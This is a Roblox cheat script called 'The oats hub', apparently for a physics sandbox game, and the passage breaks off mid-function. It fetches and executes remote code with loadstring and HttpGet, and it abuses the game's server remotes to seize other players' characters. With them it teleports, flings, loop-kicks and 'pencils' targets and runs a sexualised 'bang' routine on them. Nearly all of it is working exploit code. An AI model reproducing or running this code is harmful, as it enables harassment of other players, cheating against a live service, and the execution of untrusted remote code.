setfpscap(100000)

local RandomMessage = `[{math.random()}]`
local Passed = false

game:GetService("LogService").MessageOut:Connect(function(Message, MessageType)
	if Message == RandomMessage and MessageType == Enum.MessageType.MessageOutput then
		Passed = true
	end
end)

print(RandomMessage)

repeat
	task.wait()
until Passed


print('start')

writefile("yo.mp3", game:HttpGet("https://raw.githubusercontent.com/yesawwwwwwd/Ftapian/main/yo.mp3"))

local sound = Instance.new("Sound")
sound.SoundId = getcustomasset("yo.mp3")
sound.Volume = 0 
sound.Looped = true
sound.Parent = game.Workspace
sound:Play()

local targetVolume = 1
local fadeInTime = 2      
local fadeTime = 4        
local lifeTime = 12       


task.spawn(function()
    local steps = 20
    local stepTime = fadeInTime / steps
    
    for i = 1, steps do
        if sound then
            sound.Volume = targetVolume * (i / steps)
            task.wait(stepTime)
        end
    end
end)


task.delay(lifeTime - fadeTime, function()
    local steps = 20
    local stepTime = fadeTime / steps
    local startVolume = sound.Volume
    
    for i = 1, steps do
        if sound then
            sound.Volume = startVolume * (1 - (i / steps))
            task.wait(stepTime)
        end
    end
end)

game:GetService("Debris"):AddItem(sound, lifeTime)


Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
Window = Rayfield:CreateWindow({ 
    Name = "The oats hub",
    LoadingTitle = "organized now, yippie :D",
    LoadingSubtitle = "by oaty",
   Theme = {
    TextColor = Color3.fromRGB(240, 240, 240),
    Background = Color3.fromRGB(5, 5, 5),
    Topbar = Color3.fromRGB(10, 10, 10),
    Shadow = Color3.fromRGB(0, 120, 255),
    NotificationBackground = Color3.fromRGB(10, 10, 10),
    NotificationActionsBackground = Color3.fromRGB(0, 40, 80),
    TabBackground = Color3.fromRGB(10, 10, 10),
    TabStroke = Color3.fromRGB(0, 120, 255),
    TabBackgroundSelected = Color3.fromRGB(0, 120, 255),
    TabTextColor = Color3.fromRGB(0, 120, 255),
    SelectedTabTextColor = Color3.fromRGB(5, 5, 5),
    ElementBackground = Color3.fromRGB(10, 10, 10),
    ElementBackgroundHover = Color3.fromRGB(0, 40, 80),
    SecondaryElementBackground = Color3.fromRGB(5, 5, 5),
    ElementStroke = Color3.fromRGB(0, 120, 255),
    SecondaryElementStroke = Color3.fromRGB(0, 40, 80),
    SliderBackground = Color3.fromRGB(10, 10, 10),
    SliderProgress = Color3.fromRGB(0, 120, 255),
    SliderStroke = Color3.fromRGB(0, 120, 255),
    ToggleBackground = Color3.fromRGB(0, 60, 120),
    ToggleEnabled = Color3.fromRGB(0, 120, 255),
    ToggleDisabled = Color3.fromRGB(0, 120, 255),
    ToggleEnabledStroke = Color3.fromRGB(0, 120, 255),
    ToggleDisabledStroke = Color3.fromRGB(0, 120, 255),
    ToggleEnabledOuterStroke = Color3.fromRGB(0, 120, 255),
    ToggleDisabledOuterStroke = Color3.fromRGB(0, 120, 255),
    DropdownSelected = Color3.fromRGB(0, 40, 80),
    DropdownUnselected = Color3.fromRGB(10, 10, 10),
    InputBackground = Color3.fromRGB(0, 30, 70),
    InputStroke = Color3.fromRGB(0, 120, 255),
    PlaceholderColor = Color3.fromRGB(0, 80, 160)
   
   },
    ConfigurationSaving = {
        Enabled = false,
        FolderName = nil,
        FileName = "oatsFTAP"
    },
    Discord = {
        Enabled = true,
        Invite = "",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Key system",
        Subtitle = "Key System",
        Note = "key is oatstuff",
        FileName = "SiriusKey",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = "oatstuff"
    }
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
--[[
local WHITELIST_URL = "https://raw.githubusercontent.com/yesawwwwwwd/Oaty-hub-whitelist/main/WhitelistedUsers.lua"

local success, whitelist = pcall(function()
    return loadstring(game:HttpGet(WHITELIST_URL))()
end)

if not success or type(whitelist) ~= "table" then
    warn("Failed to load whitelist")
    return
end

if not whitelist[LocalPlayer.Name] then
    if Rayfield then
        Rayfield:Destroy()
    end
    return
end]]

--the tabs
local PlayerTab = Window:CreateTab("Local", 7743871002)
local AntiTab = Window:CreateTab("Anti's", nil)
local LoopTab = Window:CreateTab("Loop's", 7734058599)
local BlobTab = Window:CreateTab("Blobman", 7734058599)
local GrabTab = Window:CreateTab("Grab mods", 7743871002)
local AuraTab = Window:CreateTab("plr auras", 7733666258)
local ToyTab = Window:CreateTab("Toys", 4483362458)
local FigureTab = Window:CreateTab("Figure Grab", 4483345998)
local InfoTab = Window:CreateTab("Misc", 4483345998)
local TweenTab = Window:CreateTab("Tween breaker", 4483362458)






Players = game:GetService("Players")
SoundService = game:GetService("SoundService")
LocalPlayer = Players.LocalPlayer
SOUND_ID = "rbxassetid://93917079082314"

function playSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://"
    sound.Volume = 0.5
    sound.PlayOnRemove = true
    sound.Parent = game:GetService("SoundService")
    sound:Destroy()
end

if LocalPlayer.Character then
    local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.Died:Connect(function()
            task.delay(3, playSound)
        end)
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid", 10)
    if hum then
        hum.Died:Connect(function()
            task.delay(3, playSound)
        end)
    end
end)

function playTpSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://93826112721753"
    sound.Volume = 0.2
    sound.PlayOnRemove = true
    sound.Parent = game:GetService("SoundService")
    sound:Destroy()
end

--Starts here if I lose myself

Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
RunService = game:GetService("RunService")
Workspace = game:GetService("Workspace")
UserInputService = game:GetService("UserInputService")
LocalPlayer = Players.LocalPlayer

GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
RemoteSetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
RemoteDestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")
SpawnToyRF = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
Struggle = ReplicatedStorage:WaitForChild("CharacterEvents"):WaitForChild("Struggle")
StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
DestroyToyEvent = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
MenuToys = ReplicatedStorage:WaitForChild("MenuToys")

SelectedPlayer = nil
bringTimer = 0
tpTimer = 0
switchTimer = 0
Mouse = LocalPlayer:GetMouse()
KillHB = nil
LoopKillOn = false
LoopBringActive = false
LoopBangActive = false

LoopPencilActive = false
PencilList = {}
AKList = {}
PencilCooldown = {}

LoopBlobkickActive = false
BlobkickList = {}
Blob = nil
BlobkickCooldown = {}
BKA = false
BKAWL = false


ESPEnabled = false
ESPTargets = {}
ESPBoxes = {}

AllowedUsers = {"april22471","ThriIl3Rz","defnotlilabe","Spelluncis","imagineusingsolara", "Brillytheesigma","flipofficer","24k_golkxz","OatsStack","j_91","w3ap0s","66hxstxfy","ZachPlaysRoblox12332","awsd","series2t","IloveFrenchPeopleFR","Skibidib6549","ratwowee","Ssts_DiluX20","MegaMouline","SstS_DiluX","YOURBADS7","@Test002533533","Posuu_VF4","merlet33","John_Run12","tadziolubidupki","alienframesilence","koxon_675"}

BangSpeed = 0.8
BangDistance = 4
HEIGHT_LIMIT = 100000
TELEPORT_OFFSET = Vector3.new(6, -18.5, 0)

function IsAllowed(playerName)
    for _, allowedName in pairs(AllowedUsers) do
        if string.lower(allowedName) == string.lower(playerName) then
            return true
        end
    end
    return false
end

function FWC(Parent, Name, Time)
    return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time)
end

function grab(prt)
    RemoteSetNetworkOwner:FireServer(prt, prt.CFrame)
end

function SpawnPencilForPlayer(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer or not targetPlayer.Character then return nil end
    
    if not LocalPlayer.CanSpawnToy.Value then return nil end
    
    local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    if spawnedToys then
        local oldPencil = spawnedToys:FindFirstChild(playerName)
        if oldPencil then
            DestroyToyEvent:FireServer(oldPencil)
            task.wait(0.18)
        end
    end
    
    local spawnCFrame = CFrame.new(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 5))
    
    local success, result = pcall(function()
        return SpawnToyRF:InvokeServer("ToolPencil", spawnCFrame, Vector3.new(0, 0, 0))
    end)
    
    if not success then return nil end
    
    for i = 1, 10 do
        local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
        if spawnedToys then
            local pencil = spawnedToys:FindFirstChild("ToolPencil")
            if pencil then
                pencil.Name = playerName
                return pencil
            end
        end
        task.wait(0.1)
    end
    
    return nil
end

function AttachPencilToPlayer(pencil, playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local torso = targetPlayer.Character:FindFirstChild("Torso")
    if not torso then return false end
    
    task.wait(0.4)
    
    local soundPart = pencil:FindFirstChild("SoundPart")
    if soundPart then
        RemoteSetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
    end
    
    if pencil:FindFirstChild("StickyPart") then
        StickyPartEvent:FireServer(pencil.StickyPart, torso, CFrame.new(0, -1, 0) * CFrame.Angles(0, math.pi, 0))
        return true
    end
    
    return false
end

function CheckAndManagePencil(playerName)
    if not LoopPencilActive then return end
    if not table.find(PencilList, playerName) then return end
    
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer or not targetPlayer.Character then 
        local index = table.find(PencilList, playerName)
        if index then table.remove(PencilList, index) end
        return
    end
    
    if targetPlayer.InPlot.Value then return end
    
    if PencilCooldown[playerName] and tick() - PencilCooldown[playerName] < 2 then return end
    
    local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    local hasPencil = false
    
    if spawnedToys then
        local pencil = spawnedToys:FindFirstChild(playerName)
        if pencil and pencil:FindFirstChild("StickyPart") then
            local stickyWeld = pencil.StickyPart:FindFirstChild("StickyWeld")
            if stickyWeld and stickyWeld.Part1 then
                hasPencil = true
            end
        end
    end
    
    if not hasPencil then
        PencilCooldown[playerName] = tick()
        local newPencil = SpawnPencilForPlayer(playerName)
        if newPencil then
            AttachPencilToPlayer(newPencil, playerName)
        end
    end
end

function PencilPlayer(playerName, loopMode)
    if not Players:FindFirstChild(playerName) then
        return Rayfield:Notify({
            Title = "Pencil Error",
            Content = 'Player left',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetPlayer = Players:FindFirstChild(playerName)
    
    if loopMode then
        if not table.find(PencilList, playerName) then
            table.insert(PencilList, playerName)
        end
        if not LoopPencilActive then
            LoopPencilActive = true
        end
        return true
    else
        local pencil = SpawnPencilForPlayer(playerName)
        if pencil then
            local attached = AttachPencilToPlayer(pencil, playerName)
            return attached
        end
        return false
    end
end

function DestroyBlob()
    if Blob and Blob.Parent then
        DestroyToyEvent:FireServer(Blob)
        Blob = nil
    end
end

function BlobKick()
    while true do
        local smegma = true
        local listtype = 1
        local gotsomeone = false
        local listtt = {}
        
        if BKA then
            listtype = 2
            for _,plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    if BKAWL and not LocalPlayer:IsFriendsWith(plr.UserId) then
                        table.insert(listtt,plr.Name)
                    elseif not BKAWL then
                        table.insert(listtt,plr.Name)
                    end
                end
            end
        else
            listtt = BlobkickList
        end
        
        if listtype == 2 then
            if not BKA then
                smegma = false
            end
        end
        
        for _,plrr in pairs(listtt) do
            local j, h
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                j = LocalPlayer.Character.HumanoidRootPart.CFrame
                h = LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
            end
            
            if smegma and Players:FindFirstChild(plrr) and Players:FindFirstChild(plrr) ~= LocalPlayer then
                local continue = false
                local plr = Players:FindFirstChild(plrr)
                
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    if plr.Character.HumanoidRootPart.Massless then
                        if plr.Character.Humanoid.SeatPart then
                            continue = true
                        end
                    else
                        continue = true
                    end
                end
                
                if BKA and BKAWL and LocalPlayer:IsFriendsWith(Players:FindFirstChild(plrr).UserId) then
                    continue = false
                end
                
                while smegma and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and plr and plr.Character and plr.Character.Parent == Workspace and plr.Character:FindFirstChild("HumanoidRootPart") and continue do
                    if listtype == 2 then
                        if not BKA then
                            smegma = false
                        end
                    end
                    
                    gotsomeone = true
                    continue = false
                    
                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        if plr.Character.HumanoidRootPart.AssemblyLinearVelocity.Magnitude > 5000 then
                            continue = false
                        end
                        if plr.Character.HumanoidRootPart.Massless then
                            if plr.Character.Humanoid.SeatPart then
                                continue = true
                            end
                        else
                            continue = true
                        end
                    end
                    
                    if shouldcontinue and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Parent.Name == "CreatureBlobman" then
                        Blob = LocalPlayer.Character.Humanoid.SeatPart.Parent
                        local localtime = tick()
                        
                        if (plr.Character.HumanoidRootPart.CFrame.Position - LocalPlayer.Character.HumanoidRootPart.CFrame.Position + LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity).magnitude > 30 and plr.Character.Parent == Workspace then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame + (plr.Character:FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity / math.pi)
                            LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = plr.Character:FindFirstChild("HumanoidRootPart").AssemblyLinearVelocity
                            task.wait(0.25)
                            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                                RemoteSetNetworkOwner:FireServer(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.CFrame)
                            end
                        end
                        
                        local timee = tick()
                        while tick() - timee < 0.25 and plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and shouldcontinue do
                            RemoteSetNetworkOwner:FireServer(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.CFrame)
                            task.wait(0.1)
                        end
                        
                        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Blob:FindFirstChild("RightDetector") and Blob.RightDetector:FindFirstChild("RightWeld") and Blob:FindFirstChild("BlobmanSeatAndOwnerScript") and Blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab") then
                            plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,10^10,0)
                            RemoteDestroyGrabLine:FireServer(plr.Character.HumanoidRootPart)
                            Blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(Blob.RightDetector, plr.Character.HumanoidRootPart, Blob.RightDetector.RightWeld)
                        end
                    elseif continue then
                        if LocalPlayer.Character:FindFirstChild("Humanoid") then
                            if LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.SeatPart then
                                LocalPlayer.Character.Humanoid.Sit = false
                            end
                        end
                        
                        if Blob and Blob:FindFirstChild("VehicleSeat") then
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                Blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                            end
                            task.wait(0.15)
                        else
                            local foundblob = false
                            Blob = nil
                            
                            local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                            if spawnedToys then
                                for _,itm in pairs(spawnedToys:GetChildren()) do
                                    if itm.Name == "CreatureBlobman" and itm:FindFirstChild("VehicleSeat") then
                                        foundblob = true
                                        Blob = itm
                                    elseif itm.Name == "CreatureBlobman" then
                                        while itm do
                                            DestroyToyEvent:FireServer(itm)
                                            task.wait(0.15)
                                        end
                                    end
                                end
                            end
                            
                            if Blob and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                Blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                            end
                            
                            if not foundblob then
                                task.wait(0.15)
                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.Parent ~= Workspace then
                                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-10,0)
                                        LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                                    end
                                    
                                    while smegma and not Blob do
                                        if listtype == 2 then
                                            if not BKA then
                                                smegma = false
                                            end
                                        end
                                        
                                        local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                                        if spawnedToys and spawnedToys:FindFirstChild("CreatureBlobman") then
                                            Blob = spawnedToys.CreatureBlobman
                                        elseif LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.Parent ~= Workspace then
                                            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-10,0)
                                            LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                                        end
                                        
                                        if not Blob then
                                            task.spawn(function()
                                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                    SpawnToyRF:InvokeServer("CreatureBlobman", CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0,0,15), Vector3.new(0,0,0))
                                                end
                                            end)
                                        end
                                        task.wait()
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.15)
                end
            end
            
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = j
                LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = h
            end
        end
        
        if not gotsomeone and Blob then
            while Blob and Blob.Parent do
                DestroyToyEvent:FireServer(Blob)
                task.wait(0.15)
            end
            Blob = nil
        end
        task.wait()
    end
end

function BlobKickPlayer(playerName, loopMode)
    if not Players:FindFirstChild(playerName) then
        return Rayfield:Notify({
            Title = "Blobkick Error",
            Content = 'Player left',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetPlayer = Players:FindFirstChild(playerName)
    
    if loopMode then
        if not table.find(BlobkickList, playerName) then
            table.insert(BlobkickList, playerName)
        end
        if not LoopBlobkickActive then
            LoopBlobkickActive = true
        end
        return true
    else
        local tempAdded = false
        if not table.find(BlobkickList, playerName) then
            table.insert(BlobkickList, playerName)
            tempAdded = true
        end
        
        task.wait(0.15)
        
        if tempAdded then
            local index = table.find(BlobkickList, playerName)
            if index then
                table.remove(BlobkickList, index)
            end
        end
        
        return true
    end
end

task.spawn(BlobKick)


function BringPlayer(name, loopMode)
    if not Players:FindFirstChild(name) then
        return Rayfield:Notify({
            Title = "Bring Error",
            Content = 'Player left',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetPlayer = Players:FindFirstChild(name)
    local targetChar = targetPlayer.Character
    
    if not targetChar then
        return Rayfield:Notify({
            Title = "Bring Error",
            Content = 'Player has no character',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local targetHum = targetChar:FindFirstChild("Humanoid")
    
    if not targetHRP or not targetHum then return end
    
    if targetHum.Health <= 0 then
        return Rayfield:Notify({
            Title = "Bring Error",
            Content = 'Player is dead',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    if targetPlayer.InPlot.Value then
        return Rayfield:Notify({
            Title = "Bring Error",
            Content = 'Player in safe zone',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myHRP = mychar:FindFirstChild("HumanoidRootPart")
    local myHum = mychar:FindFirstChild("Humanoid")
    
    if not myHRP or not myHum then return end
    
    local BackUp = myHRP.CFrame
    local success = false
    
    for i = 1, 30 do
        if not targetHRP or not targetHRP.Parent then break end
        if myHum.Health <= 0 then break end
        
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, -2, 0)
        grab(targetHRP)
        
        if targetChar.Head:FindFirstChild("PartOwner") and targetChar.Head.PartOwner.Value == LocalPlayer.Name then
            success = true
            break
        end
        
        task.wait(0.08)
    end
    
    if not success then
        myHRP.CFrame = BackUp
        return Rayfield:Notify({
            Title = "Bring Failed",
            Content = 'Could not grab player',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    myHRP.CFrame = BackUp
    
    if loopMode then
        task.spawn(function()
            while LoopBringActive and targetChar and targetChar.Parent do
                if not Players:FindFirstChild(name) then
                    LoopBringActive = false
                    break
                end
                
                if targetPlayer.InPlot.Value or targetHum.Health <= 0 then
                    LoopBringActive = false
                    break
                end
                
                local targetCFrame = myHRP.CFrame + (myHRP.CFrame.LookVector * 3)
                targetHRP.CFrame = targetCFrame
                targetHRP.Velocity = Vector3.new()
                grab(targetHRP)
                
                task.wait()
            end
            Destroy_Line(targetHRP)
        end)
    else
        task.defer(function()
            local startTime = tick()
            while targetChar and targetChar.Parent and targetChar.Head:FindFirstChild("PartOwner") and 
                  targetChar.Head.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
                local targetCFrame = myHRP.CFrame + (myHRP.CFrame.LookVector * 3)
                targetHRP.CFrame = targetCFrame
                targetHRP.Velocity = Vector3.new()
                task.wait()
            end
            Destroy_Line(targetHRP)
        end)
    end
    
    return true
end

function BangPlayer(name, loopMode)
    if not Players:FindFirstChild(name) then
        return Rayfield:Notify({
            Title = "Bang Error",
            Content = 'Player left',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetPlayer = Players:FindFirstChild(name)
    local targetChar = targetPlayer.Character
    
    if not targetChar then
        return Rayfield:Notify({
            Title = "Bang Error",
            Content = 'Player has no character',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local targetHum = targetChar:FindFirstChild("Humanoid")
    
    if not targetHRP or not targetHum then return end
    
    if targetHum.Health <= 0 then
        return Rayfield:Notify({
            Title = "Bang Error",
            Content = 'Player is dead',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    if targetPlayer.InPlot.Value then
        return Rayfield:Notify({
            Title = "Bang Error",
            Content = 'Player in safe zone',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myHRP = mychar:FindFirstChild("HumanoidRootPart")
    local myHum = mychar:FindFirstChild("Humanoid")
    
    if not myHRP or not myHum then return end
    
    local BackUp = myHRP.CFrame
    local success = false
    
    for i = 1, 30 do
        if not targetHRP or not targetHRP.Parent then break end
        if myHum.Health <= 0 then break end
        
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, -2, 0)
        grab(targetHRP)
        
        if targetChar.Head:FindFirstChild("PartOwner") and targetChar.Head.PartOwner.Value == LocalPlayer.Name then
            success = true
            break
        end
        
        task.wait(0.05)
    end
    
    if not success then
        myHRP.CFrame = BackUp
        return Rayfield:Notify({
            Title = "Bang Failed",
            Content = 'Could not grab player',
            Duration = 3,
            Image = 7743878857,
        })
    end
    
    myHRP.CFrame = BackUp
    
    if loopMode then
        task.spawn(function()
            local bangOffset = 0
            local bangDirection = 1
            
            while LoopBangActive and targetChar and targetChar.Parent do
                if not Players:FindFirstChild(name) then
                    LoopBangActive = false
                    break
                end
                
                if targetPlayer.InPlot.Value or targetHum.Health <= 0 then
                    LoopBangActive = false
                    break
                end
                
                bangOffset = bangOffset + (bangDirection * (BangSpeed * 0.08))
                
                if bangOffset >= BangDistance then
                    bangDirection = -1
                elseif bangOffset <= 0 then
                    bangDirection = 2
                end
                
                local targetCFrame = myHRP.CFrame + (myHRP.CFrame.LookVector * bangOffset)
                targetHRP.CFrame = targetCFrame
                targetHRP.Velocity = Vector3.new()
                grab(targetHRP)
                
                task.wait()
            end
            Destroy_Line(targetHRP)
        end)
    else
        task.defer(function()
            local startTime = tick()
            local bangOffset = 0
            local bangDirection = 2
            
            while targetChar and targetChar.Parent and targetChar.Head:FindFirstChild("PartOwner") and 
                  targetChar.Head.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 3 do
                
                bangOffset = bangOffset + (bangDirection * (BangSpeed * 0.3))
                
                if bangOffset >= BangDistance then
                    bangDirection = -1
                elseif bangOffset <= 0 then
                    bangDirection = 2
                end
                
                local targetCFrame = myHRP.CFrame + (myHRP.CFrame.LookVector * bangOffset)
                targetHRP.CFrame = targetCFrame
                targetHRP.Velocity = Vector3.new()
                
                task.wait()
            end
            Destroy_Line(targetHRP)
        end)
    end
    
    return true
end

function SwitchPlayer()
    if switchTimer ~= 0 then return end
    
    if not Players:FindFirstChild(SelectedPlayer) then
        return Rayfield:Notify({
            Title = "Switch error",
            Content = 'Player left',
            Duration = 4,
            Image = 7743878056,
        })
    end
    
    targetPlayer = Players:FindFirstChild(SelectedPlayer)
    targetChar = targetPlayer.Character
    
    if not targetChar then return end
    
    targetHum = FWC(targetChar, "Humanoid", 3)
    HRP = FWC(targetChar, "HumanoidRootPart", 3)
    
    if targetHum.Health == 0 or targetPlayer.InPlot.Value then
        return Rayfield:Notify({
            Title = "Switch Error",
            Content = 'Player died or in safe-zone',
            Duration = 4,
            Image = 7743878857,
        })
    end
    
    mychar = LocalPlayer.Character
    myHRP = FWC(mychar, "HumanoidRootPart", 3)
    BackUp = myHRP.CFrame
    
    while task.wait() and HRP and FWC(mychar, "Humanoid").Health ~= 0 and not (HRP.Parent.Head:FindFirstChild("PartOwner")) or (HRP.Parent.Head:FindFirstChild("PartOwner") and HRP.Parent.Head:FindFirstChild("PartOwner").Value ~= LocalPlayer.Name) do
        if switchTimer > 75 then
            myHRP.CFrame = BackUp
            switchTimer = 0
            return
        else
            switchTimer = switchTimer + 1
        end
        
        if Workspace.PlotItems.PlayersInPlots:FindFirstChild(SelectedPlayer) or LocalPlayer.IsHeld.Value == true then
            myHRP.CFrame = BackUp
            return
        end
        
        myHRP.CFrame = HRP.CFrame
        task.defer(grab, HRP)
    end
    
    for _, prt in pairs(HRP.Parent:GetChildren()) do
        if prt:IsA("Part") then
            prt.Velocity = Vector3.new()
        end
    end
    
    HRP.CFrame = BackUp
    
    if GrabFlag == "Default" then
        Destroy_Line(HRP)
    end
    
    for _, prt in pairs(myHRP.Parent:GetChildren()) do
        if prt:IsA("Part") then
            prt.Velocity = Vector3.new()
        end
    end
    
    switchTimer = 0
end

function TPPlayerToWater(name)
    if not Players:FindFirstChild(name) then
        return Rayfield:Notify({
            Title = "TP Error",
            Content = 'Player left',
            Duration = 4,
            Image = 7743878056,
        })
    end
    
    targetPlayer = Players:FindFirstChild(name)
    targetChar = targetPlayer.Character
    
    if not targetChar then return end
    
    targetHum = FWC(targetChar, "Humanoid", 3)
    targetHRP = FWC(targetChar, "HumanoidRootPart", 3)
    targetHead = FWC(targetChar, "Head", 3)
    
    if targetHum.Health == 0 or targetHum:GetState() == Enum.HumanoidStateType.Dead then
        return Rayfield:Notify({
            Title = "TP Error",
            Content = 'Player died',
            Duration = 4,
            Image = 7743878857,
        })
    end
    
    if targetPlayer.InPlot.Value then
        return Rayfield:Notify({
            Title = "TP Error",
            Content = 'Player in House',
            Duration = 4,
            Image = 7743878857,
        })
    end
    
    mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    myhum = FWC(mychar, "Humanoid", 3)
    myHRP = FWC(mychar, "HumanoidRootPart", 3)
    myHead = FWC(mychar, "Head", 3)
    
    last_pos = targetHRP.Position
    BackUp = myHRP.CFrame
    
    function Stop(Back)
        myHRP.CFrame = Back
        for _, prt in pairs(mychar:GetChildren()) do
            if prt:IsA("BasePart") then
                prt.Velocity = Vector3.new()
            end
        end
        tpTimer = 0
    end
    
    task.spawn(function()
        while (not (targetHead:FindFirstChild("PartOwner")) or targetHead:FindFirstChild("PartOwner").Value ~= LocalPlayer.Name) and task.wait(0.1) do
            if last_pos ~= targetHRP.Position then
                last_pos = targetHRP.Position
            end
        end
    end)
    
    while not (targetHead:FindFirstChild("PartOwner")) or (targetHead:FindFirstChild("PartOwner") and targetHead:FindFirstChild("PartOwner").Value ~= LocalPlayer.Name) do
        if targetHRP and targetHRP.Parent and myhum.Health ~= 0 and targetHum.Health ~= 0 then
            if tpTimer < 74 and not (targetPlayer.InPlot.Value) then
                tpTimer = tpTimer + 1
                if not (LocalPlayer.IsHeld.Value) then
                    myHRP.CFrame = targetHRP.CFrame + ((targetHRP.Position - last_pos) * LocalPlayer:GetNetworkPing() * 25) + Vector3.new(0, -3.5, 0)
                    task.spawn(grab, targetHRP)
                    task.wait()
                else
                    while myHead:FindFirstChild("PartOwner") do
                        Struggle:FireServer(LocalPlayer)
                        task.wait()
                    end
                end
            else
                Stop(BackUp)
                return
            end
        else
            Stop(BackUp)
            return
        end
    end
    
    myHRP.CFrame = BackUp
    
    waterPos = Vector3.new(320, -61, 423)
    
    task.defer(function()
        startTime = tick()
        while targetHead and targetHead.Parent and (targetHead:FindFirstChild("PartOwner") and targetHead:FindFirstChild("PartOwner").Value == LocalPlayer.Name) and tick() - startTime < 5 do
            if not targetHead.BallSocketConstraint.Enabled then
